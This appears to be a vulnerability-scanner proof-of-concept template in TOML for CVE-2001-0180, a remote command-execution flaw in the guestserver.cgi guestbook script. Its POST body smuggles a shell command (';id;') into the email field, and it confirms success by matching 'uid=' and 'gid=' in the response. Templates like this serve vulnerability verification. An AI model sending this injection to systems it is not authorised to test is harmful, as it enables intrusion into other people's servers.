[info]
author = "ave"
description = "Lars Ellingsen guestserver.cgi 远程命令执行漏洞验证，通过 email 参数注入 shell 元字符执行任意命令"
id = "POC-AVE-2001-0908"
name = "CVE-2001-0180 PoC"
severity = "critical"
tags = ["ave-2001-0908"]
vuln_id = [
    "CVE-2001-0180",
    "AVE-2001-0908",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/guestserver.cgi"
protocol = "http"

[poc.requests.body]
content = "email=test%40example.com%3Bid%3B&submit=Sign+Guestbook"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]

